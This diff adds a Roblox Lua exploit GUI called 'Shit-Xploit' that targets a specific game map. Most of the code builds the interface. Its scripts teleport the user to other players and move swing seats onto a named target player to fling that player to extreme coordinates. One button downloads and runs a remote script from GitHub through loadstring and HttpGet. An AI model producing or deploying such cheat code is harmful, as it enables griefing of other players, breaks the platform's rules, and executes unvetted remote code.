@@ -1,0 +1,1062 @@
+local ShitXploit = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local line = Instance.new("Frame")
+local inside = Instance.new("Frame")
+local UIGridLayout = Instance.new("UIGridLayout")
+local Spaceship = Instance.new("TextButton")
+local UIGradient = Instance.new("UIGradient")
+local UICorner = Instance.new("UICorner")
+local GP = Instance.new("TextButton")
+local UIGradient_2 = Instance.new("UIGradient")
+local UICorner_2 = Instance.new("UICorner")
+local TP = Instance.new("TextButton")
+local UIGradient_3 = Instance.new("UIGradient")
+local UICorner_3 = Instance.new("UICorner")
+local INFY = Instance.new("TextButton")
+local UIGradient_4 = Instance.new("UIGradient")
+local UICorner_4 = Instance.new("UICorner")
+local UIGradient_5 = Instance.new("UIGradient")
+local UICorner_5 = Instance.new("UICorner")
+local UIGradient_6 = Instance.new("UIGradient")
+local background = Instance.new("Frame")
+local UICorner_6 = Instance.new("UICorner")
+local UIGradient_7 = Instance.new("UIGradient")
+local background2 = Instance.new("Frame")
+local UICorner_7 = Instance.new("UICorner")
+local UIGradient_8 = Instance.new("UIGradient")
+local TextBox = Instance.new("TextBox")
+local ImageLabel = Instance.new("ImageLabel")
+local SuggestionLabel = Instance.new("TextLabel")
+local swingSelector = Instance.new("Frame")
+local UIGridLayout_2 = Instance.new("UIGridLayout")
+local Swing1 = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local UIGradient_9 = Instance.new("UIGradient")
+local TextLabel = Instance.new("TextLabel")
+local Swing2 = Instance.new("TextButton")
+local UICorner_9 = Instance.new("UICorner")
+local UIGradient_10 = Instance.new("UIGradient")
+local TextLabel_2 = Instance.new("TextLabel")
+local GOTO = Instance.new("ImageButton")
+local BACK = Instance.new("ImageButton")
+local reset = Instance.new("ImageButton")
+local shitXploit = Instance.new("ImageButton")
+
+-- Properties:
+
+ShitXploit.Name = "ShitXploit"
+ShitXploit.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ShitXploit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ShitXploit.ResetOnSpawn = false
+
+Main.Name = "Main"
+Main.Parent = ShitXploit
+Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+Main.BackgroundTransparency = 0.020
+Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.369791657, 0, 0.360853404, 0)
+Main.Size = UDim2.new(0, 499, 0, 300)
+
+Title.Name = "Title"
+Title.Parent = Main
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1.000
+Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(0, 9, 0, 3)
+Title.Size = UDim2.new(0, 128, 0, 25)
+Title.Font = Enum.Font.Unknown
+Title.Text = "Shit-Xploit"
+Title.TextColor3 = Color3.fromRGB(0, 255, 0)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+line.Name = "line"
+line.Parent = Main
+line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+line.BackgroundTransparency = 0.550
+line.BorderColor3 = Color3.fromRGB(0, 0, 0)
+line.BorderSizePixel = 0
+line.Position = UDim2.new(0, 0, 0.103333332, 0)
+line.Size = UDim2.new(0, 500, 0, 2)
+
+inside.Name = "inside"
+inside.Parent = Main
+inside.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+inside.BorderColor3 = Color3.fromRGB(0, 0, 0)
+inside.BorderSizePixel = 0
+inside.Position = UDim2.new(0.0199999996, 0, 0.13666667, 0)
+inside.Size = UDim2.new(0, 480, 0, 250)
+
+UIGridLayout.Parent = inside
+UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.CellSize = UDim2.new(0, 230, 0, 75)
+
+Spaceship.Name = "Spaceship"
+Spaceship.Parent = inside
+Spaceship.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Spaceship.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Spaceship.BorderSizePixel = 0
+Spaceship.Size = UDim2.new(0, 200, 0, 50)
+Spaceship.Font = Enum.Font.GothamBold
+Spaceship.Text = "Spaceship"
+Spaceship.TextColor3 = Color3.fromRGB(255, 255, 255)
+Spaceship.TextScaled = true
+Spaceship.TextSize = 14.000
+Spaceship.TextWrapped = true
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient.Rotation = -71
+UIGradient.Parent = Spaceship
+
+UICorner.CornerRadius = UDim.new(0, 6)
+UICorner.Parent = Spaceship
+
+GP.Name = "GP"
+GP.Parent = inside
+GP.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+GP.BorderColor3 = Color3.fromRGB(0, 0, 0)
+GP.BorderSizePixel = 0
+GP.Size = UDim2.new(0, 200, 0, 50)
+GP.Font = Enum.Font.GothamBold
+GP.Text = "GetPlayer"
+GP.TextColor3 = Color3.fromRGB(255, 255, 255)
+GP.TextScaled = true
+GP.TextSize = 14.000
+GP.TextWrapped = true
+
+UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient_2.Rotation = -104
+UIGradient_2.Parent = GP
+
+UICorner_2.CornerRadius = UDim.new(0, 6)
+UICorner_2.Parent = GP
+
+TP.Name = "TP"
+TP.Parent = inside
+TP.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TP.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TP.BorderSizePixel = 0
+TP.Size = UDim2.new(0, 200, 0, 50)
+TP.Font = Enum.Font.GothamBold
+TP.Text = "Teleport "
+TP.TextColor3 = Color3.fromRGB(255, 255, 255)
+TP.TextScaled = true
+TP.TextSize = 14.000
+TP.TextWrapped = true
+
+UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient_3.Rotation = -71
+UIGradient_3.Parent = TP
+
+UICorner_3.CornerRadius = UDim.new(0, 6)
+UICorner_3.Parent = TP
+
+INFY.Name = "INFY"
+INFY.Parent = inside
+INFY.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+INFY.BorderColor3 = Color3.fromRGB(0, 0, 0)
+INFY.BorderSizePixel = 0
+INFY.Size = UDim2.new(0, 200, 0, 50)
+INFY.Font = Enum.Font.GothamBold
+INFY.Text = "Infinite yield"
+INFY.TextColor3 = Color3.fromRGB(255, 255, 255)
+INFY.TextScaled = true
+INFY.TextSize = 14.000
+INFY.TextWrapped = true
+
+UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient_4.Rotation = -104
+UIGradient_4.Parent = INFY
+
+UICorner_4.CornerRadius = UDim.new(0, 6)
+UICorner_4.Parent = INFY
+
+UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient_5.Rotation = 64
+UIGradient_5.Parent = inside
+
+UICorner_5.CornerRadius = UDim.new(0, 5)
+UICorner_5.Parent = Main
+
+UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient_6.Rotation = -49
+UIGradient_6.Parent = Main
+
+background.Name = "background"
+background.Parent = Main
+background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+background.BorderColor3 = Color3.fromRGB(0, 0, 0)
+background.BorderSizePixel = 0
+background.Position = UDim2.new(0.0340000056, 0, 0.693333328, 0)
+background.Size = UDim2.new(0, 466, 0, 75)
+
+UICorner_6.Parent = background
+
+UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(13, 13, 13)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(35, 36, 45))}
+UIGradient_7.Rotation = -85
+UIGradient_7.Parent = background
+
+background2.Name = "background2"
+background2.Parent = background
+background2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+background2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+background2.BorderSizePixel = 0
+background2.Position = UDim2.new(0.0211244505, 0, 0.163333327, 0)
+background2.Size = UDim2.new(0, 445, 0, 50)
+
+UICorner_7.CornerRadius = UDim.new(0, 3)
+UICorner_7.Parent = background2
+
+UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(21, 22, 27))}
+UIGradient_8.Rotation = -85
+UIGradient_8.Parent = background2
+
+TextBox.Parent = background
+TextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextBox.BackgroundTransparency = 1.000
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.0575629622, 0, 0.162999675, 0)
+TextBox.Size = UDim2.new(0, 379, 0, 50)
+TextBox.ZIndex = 2
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 20.000
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+
+ImageLabel.Parent = background
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.879828334, 0, 0.266666681, 0)
+ImageLabel.Size = UDim2.new(0, 35, 0, 35)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=6031154871"
+
+SuggestionLabel.Name = "SuggestionLabel"
+SuggestionLabel.Parent = background
+SuggestionLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SuggestionLabel.BackgroundTransparency = 1.000
+SuggestionLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SuggestionLabel.BorderSizePixel = 0
+SuggestionLabel.Position = UDim2.new(0.0579999983, 0, 0.163000003, 0)
+SuggestionLabel.Size = UDim2.new(0, 379, 0, 50)
+SuggestionLabel.Font = Enum.Font.SourceSans
+SuggestionLabel.Text = ""
+SuggestionLabel.TextColor3 = Color3.fromRGB(178, 178, 178)
+SuggestionLabel.TextSize = 20.000
+SuggestionLabel.TextTransparency = 0.500
+SuggestionLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+swingSelector.Name = "swingSelector"
+swingSelector.Parent = Main
+swingSelector.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+swingSelector.BackgroundTransparency = 1.000
+swingSelector.BorderColor3 = Color3.fromRGB(0, 0, 0)
+swingSelector.BorderSizePixel = 0
+swingSelector.Size = UDim2.new(0, 500, 0, 31)
+
+UIGridLayout_2.Parent = swingSelector
+UIGridLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout_2.VerticalAlignment = Enum.VerticalAlignment.Center
+UIGridLayout_2.CellPadding = UDim2.new(0, 10, 0, 5)
+UIGridLayout_2.CellSize = UDim2.new(0, 75, 0, 20)
+
+Swing1.Name = "Swing1"
+Swing1.Parent = swingSelector
+Swing1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Swing1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Swing1.BorderSizePixel = 0
+Swing1.Position = UDim2.new(0.444000006, 0, -3.11290312, 0)
+Swing1.Size = UDim2.new(0, 200, 0, 50)
+Swing1.Font = Enum.Font.Unknown
+Swing1.Text = ""
+Swing1.TextColor3 = Color3.fromRGB(255, 255, 255)
+Swing1.TextScaled = true
+Swing1.TextSize = 14.000
+Swing1.TextWrapped = true
+
+UICorner_8.CornerRadius = UDim.new(0, 5)
+UICorner_8.Parent = Swing1
+
+UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(21, 22, 27))}
+UIGradient_9.Rotation = -85
+UIGradient_9.Parent = Swing1
+
+TextLabel.Parent = Swing1
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 75, 0, 20)
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.Text = "Swing 1"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+Swing2.Name = "Swing2"
+Swing2.Parent = swingSelector
+Swing2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Swing2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Swing2.BorderSizePixel = 0
+Swing2.Position = UDim2.new(0.444000006, 0, -3.11290312, 0)
+Swing2.Size = UDim2.new(0, 200, 0, 50)
+Swing2.Font = Enum.Font.Unknown
+Swing2.Text = ""
+Swing2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Swing2.TextScaled = true
+Swing2.TextSize = 14.000
+Swing2.TextWrapped = true
+
+UICorner_9.CornerRadius = UDim.new(0, 5)
+UICorner_9.Parent = Swing2
+
+UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(21, 22, 27))}
+UIGradient_10.Rotation = -85
+UIGradient_10.Parent = Swing2
+
+TextLabel_2.Parent = Swing2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Size = UDim2.new(0, 75, 0, 20)
+TextLabel_2.Font = Enum.Font.Gotham
+TextLabel_2.Text = "Swing 2"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+GOTO.Name = "GOTO"
+GOTO.Parent = Main
+GOTO.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GOTO.BackgroundTransparency = 1.000
+GOTO.BorderColor3 = Color3.fromRGB(0, 0, 0)
+GOTO.BorderSizePixel = 0
+GOTO.Position = UDim2.new(0.865731359, 0, 0.00999999978, 0)
+GOTO.Size = UDim2.new(0, 25, 0, 25)
+GOTO.Image = "http://www.roblox.com/asset/?id=6031229343"
+
+BACK.Name = "BACK"
+BACK.Parent = Main
+BACK.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+BACK.BackgroundTransparency = 1.000
+BACK.BorderColor3 = Color3.fromRGB(0, 0, 0)
+BACK.BorderSizePixel = 0
+BACK.Position = UDim2.new(0.805611074, 0, 0.00999999978, 0)
+BACK.Size = UDim2.new(0, 25, 0, 25)
+BACK.Image = "http://www.roblox.com/asset/?id=6031097226"
+
+reset.Name = "reset"
+reset.Parent = Main
+reset.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+reset.BackgroundTransparency = 1.000
+reset.BorderColor3 = Color3.fromRGB(0, 0, 0)
+reset.BorderSizePixel = 0
+reset.Position = UDim2.new(0.931032121, 0, 0.00999999978, 0)
+reset.Size = UDim2.new(0, 25, 0, 25)
+reset.Image = "http://www.roblox.com/asset/?id=6031260800"
+
+shitXploit.Name = "shitXploit"
+shitXploit.Parent = ShitXploit
+shitXploit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+shitXploit.BackgroundTransparency = 1.000
+shitXploit.BorderColor3 = Color3.fromRGB(0, 0, 0)
+shitXploit.BorderSizePixel = 0
+shitXploit.Position = UDim2.new(0.00650000013, 0, 0.855000019, 0)
+shitXploit.Size = UDim2.new(0, 100, 0, 142)
+shitXploit.Image = "rbxassetid://96939134364003"
+
+-- Scripts:
+
+local function ESECL_fake_script() -- Title.LocalScript 
+	local script = Instance.new('LocalScript', Title)
+
+	local textlabel = script.Parent
+	
+	while true do
+		wait(10)
+		textlabel.Text = "S41t-Xpl01t"
+		wait(0.01)
+		textlabel.Text = "Sh1t-Xpl01t"
+		wait(0.01)
+		textlabel.Text = "Shit-Xpl01t"
+		wait(0.01)
+		textlabel.Text = "Shit-Xplo1t"
+		wait(0.01)
+		textlabel.Text = "Shit-Xploit"
+		wait(1)
+		textlabel.Text = "S41t-Xpl01t"
+		wait(0.01)
+		textlabel.Text = "Sh1t-Xpl01t"
+		wait(0.01)
+		textlabel.Text = "Shit-Xpl01t"
+		wait(0.01)
+		textlabel.Text = "Shit-Xplo1t"
+		wait(0.01)
+		textlabel.Text = "Shit-Xploit"
+	end
+end
+coroutine.wrap(ESECL_fake_script)()
+local function DOGYKZV_fake_script() -- Spaceship.LocalScript 
+	local script = Instance.new('LocalScript', Spaceship)
+
+	local button = script.Parent
+	local SPCEBUTTON = script.Parent.Parent.Parent.swingSelector.Swing1
+	local SPCEBUTTON2 = script.Parent.Parent.Parent.swingSelector.Swing2
+	
+	local search = script.Parent.Parent.Parent.background.TextBox
+	local plr = game.Players.LocalPlayer
+	local char = plr.Character
+	local targetPlayer = nil
+	local selectedSpace = "Space1"
+	
+	local function findTargetPlayer()
+		for _, player in pairs(game.Players:GetPlayers()) do
+			if player.Name:lower() == search.Text:lower() or player.DisplayName:lower() == search.Text:lower() then
+				return player
+			end
+		end
+		return nil
+	end
+	
+	-- Space1 logic
+	local function Space1()
+		if targetPlayer then
+			local char2 = targetPlayer.Character
+			local play = game.Workspace.Map.ClubIsland.Playround
+	
+			local function getPlayer()
+				if char2 then
+					for _ = 1, 25 do
+						play.Equiptment.SwingSet.Swing1.SwingSeat.CFrame = char2.HumanoidRootPart.CFrame + Vector3.new(0, -2, 0)
+						wait(0.00001)
+					end
+					for _ = 1, 100 do
+						play.Equiptment.SwingSet.Swing1.SwingSeat.CFrame = CFrame.new(0, 10000000, 0)
+						wait(0.00001)
+					end
+				end
+			end
+	
+			local originalPosition = char.HumanoidRootPart.CFrame
+	
+			local function teleportBack()
+				local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+				humanoidRootPart.CFrame = play.Equiptment.SwingSet.Swing1.SwingSeat.CFrame
+	
+				wait(0.5)
+	
+				humanoidRootPart.CFrame = originalPosition
+	
+			end
+	
+			local function fixRope()
+				play.Equiptment.SwingSet.Swing1.LeftRope.Length = 1000000
+				play.Equiptment.SwingSet.Swing1.RightRope.Length = 1000000
+			end
+	
+			teleportBack()
+	
+			wait(0.2)
+	
+			fixRope()
+	
+			wait(0.5)
+	
+			getPlayer()
+		end
+	end
+	
+	local function Space2()
+		if targetPlayer then
+			local char2 = targetPlayer.Character
+			local play = game.Workspace.Map.ClubIsland.Playround
+	
+			local function getPlayer()
+				if char2 then
+					for _ = 1, 25 do
+						play.Equiptment.SwingSet.Swing2.SwingSeat.CFrame = char2.HumanoidRootPart.CFrame + Vector3.new(0, -2, 0)
+						wait(0.00001)
+					end
+					for _ = 1, 100 do
+						play.Equiptment.SwingSet.Swing2.SwingSeat.CFrame = CFrame.new(0, 10000000, 0)
+						wait(0.00001)
+					end
+				end
+			end
+	
+			local originalPosition = char.HumanoidRootPart.CFrame
+	
+			local function teleportBack()
+				local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+				humanoidRootPart.CFrame = play.Equiptment.SwingSet.Swing2.SwingSeat.CFrame
+	
+				wait(0.5)
+	
+				humanoidRootPart.CFrame = originalPosition
+	
+			end
+	
+			local function fixRope()
+				play.Equiptment.SwingSet.Swing2.LeftRope.Length = 1000000
+				play.Equiptment.SwingSet.Swing2.RightRope.Length = 1000000
+			end
+	
+			teleportBack()
+	
+			wait(0.2)
+	
+			fixRope()
+	
+			wait(0.5)
+	
+			getPlayer()
+		end
+	end
+	
+	SPCEBUTTON.MouseButton1Click:Connect(function()
+		selectedSpace = "Space1"
+	end)
+	
+	SPCEBUTTON2.MouseButton1Click:Connect(function()
+		selectedSpace = "Space2"
+	end)
+	
+	button.MouseButton1Click:Connect(function()
+		targetPlayer = findTargetPlayer()
+	
+		if not targetPlayer then
+			warn("No target player found!")
+			return
+		end
+	
+		if selectedSpace == "Space1" then
+			Space1()
+		elseif selectedSpace == "Space2" then
+			Space2()
+		else
+			warn("No space button selected!")
+		end
+	end)
+	
+	
+	
+	
+end
+coroutine.wrap(DOGYKZV_fake_script)()
+local function UWLF_fake_script() -- GP.LocalScript 
+	local script = Instance.new('LocalScript', GP)
+
+	local button = script.Parent
+	local SWNGBUTTON = script.Parent.Parent.Parent.swingSelector.Swing1
+	local SWNGBUTTON2 = script.Parent.Parent.Parent.swingSelector.Swing2
+	
+	local search = script.Parent.Parent.Parent.background.TextBox
+	local plr = game.Players.LocalPlayer
+	local char = plr.Character
+	local targetPlayer = nil
+	local selectedSwing = "Swing1" 
+	
+	local function findTargetPlayer()
+		for _, player in pairs(game.Players:GetPlayers()) do
+			if player.Name:lower() == search.Text:lower() or player.DisplayName:lower() == search.Text:lower() then
+				return player
+			end
+		end
+		return nil
+	end
+	
+	local function swing1()
+		if targetPlayer then
+			local char2 = targetPlayer.Character
+			local play = game.Workspace.Map.ClubIsland.Playround
+	
+	
+			play.Equiptment.SwingSet.Swing1.LeftRope.Length = 100000
+			play.Equiptment.SwingSet.Swing1.RightRope.Length = 100000
+	
+			wait(0.1)
+	
+			char.HumanoidRootPart.CFrame = play.Equiptment.SwingSet.Swing1.SwingSeat.CFrame + Vector3.new(7, 5, 0)
+	
+			wait(0.1)
+	
+			play.Equiptment.SwingSet.Swing1.SwingSeat.CFrame = char2.HumanoidRootPart.CFrame
+		end
+	end
+	
+	local function swing2()
+		if targetPlayer then
+			local char2 = targetPlayer.Character
+			local play = game.Workspace.Map.ClubIsland.Playround
+	
+	
+			play.Equiptment.SwingSet.Swing2.LeftRope.Length = 100000
+			play.Equiptment.SwingSet.Swing2.RightRope.Length = 100000
+	
+			wait(0.1)
+	
+			char.HumanoidRootPart.CFrame = play.Equiptment.SwingSet.Swing2.SwingSeat.CFrame + Vector3.new(7, 5, 0)
+	
+			wait(0.1)
+	
+			play.Equiptment.SwingSet.Swing2.SwingSeat.CFrame = char2.HumanoidRootPart.CFrame
+		end
+	end
+	
+	-- Button click handlers
+	SWNGBUTTON.MouseButton1Click:Connect(function()
+		selectedSwing = "Swing1"
+	end)
+	
+	SWNGBUTTON2.MouseButton1Click:Connect(function()
+		selectedSwing = "Swing2"
+	end)
+	
+	button.MouseButton1Click:Connect(function()
+		-- Update targetPlayer based on the current TextBox value
+		targetPlayer = findTargetPlayer()
+	
+		if not targetPlayer then
+			warn("No target player found!")
+			return
+		end
+	
+		if selectedSwing == "Swing1" then
+			swing1()
+		elseif selectedSwing == "Swing2" then
+			swing2()
+		else
+			warn("No swing button selected!")
+		end
+	end)
+	
+end
+coroutine.wrap(UWLF_fake_script)()
+local function ARODGMK_fake_script() -- TP.LocalScript 
+	local script = Instance.new('LocalScript', TP)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local search = script.Parent.Parent.Parent.background.TextBox
+		local plr = game.Players.LocalPlayer
+		local char = plr.Character
+		
+		
+		for _, player in pairs(game.Players:GetPlayers()) do
+			if player.Name:lower() == search.Text:lower() or player.DisplayName:lower() == search.text:lower() then
+				targetPlayer = player
+				break
+			end
+		end
+	
+		-- Check if the target player was found
+		if targetPlayer then
+			local char2 = targetPlayer.Character
+			
+			char.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
+			
+		end
+	end)
+end
+coroutine.wrap(ARODGMK_fake_script)()
+local function ZRUFVXM_fake_script() -- INFY.LocalScript 
+	local script = Instance.new('LocalScript', INFY)
+
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+	end)
+end
+coroutine.wrap(ZRUFVXM_fake_script)()
+local function XZTW_fake_script() -- TextBox.LocalScript 
+	local script = Instance.new('LocalScript', TextBox)
+
+	local textBox = script.Parent
+	local suggestionLabel = script.Parent.Parent:WaitForChild("SuggestionLabel") -- Adjust the path if necessary
+	local players = game:GetService("Players")
+	
+	-- Function to get all player names
+	local function getAllPlayerNames()
+		local playerNames = {}
+		for _, player in pairs(players:GetPlayers()) do
+			table.insert(playerNames, player.Name)
+			table.insert(playerNames, player.DisplayName) -- Add display names
+		end
+		return playerNames
+	end
+	
+	-- Function to find the first matching player name
+	local function findFirstMatchingPlayerName(input)
+		local playerNames = getAllPlayerNames()
+		for _, name in pairs(playerNames) do
+			if name:lower():sub(1, #input) == input:lower() then
+				return name
+			end
+		end
+		return nil
+	end
+	
+	-- Function to show suggestions while typing
+	local function showSuggestions()
+		local input = textBox.Text
+		local suggestion = findFirstMatchingPlayerName(input)
+	
+		if suggestion and input ~= "" then
+			-- Show the suggestion in the TextLabel
+			suggestionLabel.Text = input .. suggestion:sub(#input + 1)
+		else
+			-- Clear the suggestion if no match is found or input is empty
+			suggestionLabel.Text = ""
+		end
+	end
+	
+	-- Function to auto-complete player name when Enter is pressed
+	local function autoCompletePlayerName()
+		local input = textBox.Text
+		local suggestion = findFirstMatchingPlayerName(input)
+	
+		if suggestion and input ~= "" then
+			textBox.Text = suggestion
+		end
+	end
+	
+	-- Connect to the TextBox events
+	textBox:GetPropertyChangedSignal("Text"):Connect(showSuggestions)
+	textBox.Focused:Connect(function()
+		textBox.Text = ""
+		suggestionLabel.Text = ""
+	end)
+	textBox.FocusLost:Connect(function()
+		suggestionLabel.Text = ""
+	end)
+	
+	-- Connect to the UserInputService to detect Enter key press
+	game:GetService("UserInputService").InputBegan:Connect(function(input)
+		if input.KeyCode == Enum.KeyCode.Return then
+			autoCompletePlayerName()
+		end
+	end)
+end
+coroutine.wrap(XZTW_fake_script)()
+local function NCNEXIN_fake_script() -- Main.DragScript 
+	local script = Instance.new('LocalScript', Main)
+
+	--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
+	--Put this inside of your Frame and configure the speed if you would like.
+	--Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
+	
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.25
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+	
+end
+coroutine.wrap(NCNEXIN_fake_script)()
+local function CVFG_fake_script() -- swingSelector.LocalScript 
+	local script = Instance.new('LocalScript', swingSelector)
+
+	local swing1 = script.Parent.Swing1
+	local swing2 = script.Parent.Swing2
+	
+	local text1 = swing1:FindFirstChild("TextLabel")
+	local text2 = swing2:FindFirstChild("TextLabel")
+	
+	local function SWNG1()
+		text2.Font = Enum.Font.Montserrat
+		text1.Font = Enum.Font.MontserratBold
+	end
+	
+	local function SWNG2()
+		text1.Font = Enum.Font.Montserrat
+		text2.Font = Enum.Font.MontserratBold
+	end
+	
+	
+	
+	swing1.MouseButton1Click:Connect(SWNG1)
+	
+	swing2.MouseButton1Click:Connect(SWNG2)
+	
+	
+end
+coroutine.wrap(CVFG_fake_script)()
+local function PYMFTPV_fake_script() -- GOTO.LocalScript 
+	local script = Instance.new('LocalScript', GOTO)
+
+	local button = script.Parent
+	local char = game.Players.LocalPlayer.Character
+	local play = game.Workspace.Map.ClubIsland.Playround
+	
+	button.MouseButton1Click:Connect(function()
+		if play then
+			char.HumanoidRootPart.CFrame = play.Equiptment.SwingSet.Swing1.SwingSeat.CFrame * CFrame.new(7, 5, 0)
+		end
+	end)
+end
+coroutine.wrap(PYMFTPV_fake_script)()
+local function ZVCGX_fake_script() -- BACK.LocalScript 
+	local script = Instance.new('LocalScript', BACK)
+
+	local button = script.Parent
+	local char = game.Players.LocalPlayer.Character
+	
+	button.MouseButton1Click:Connect(function()
+		char.HumanoidRootPart.CFrame = CFrame.new(166, 3, 369)
+	end)
+end
+coroutine.wrap(ZVCGX_fake_script)()
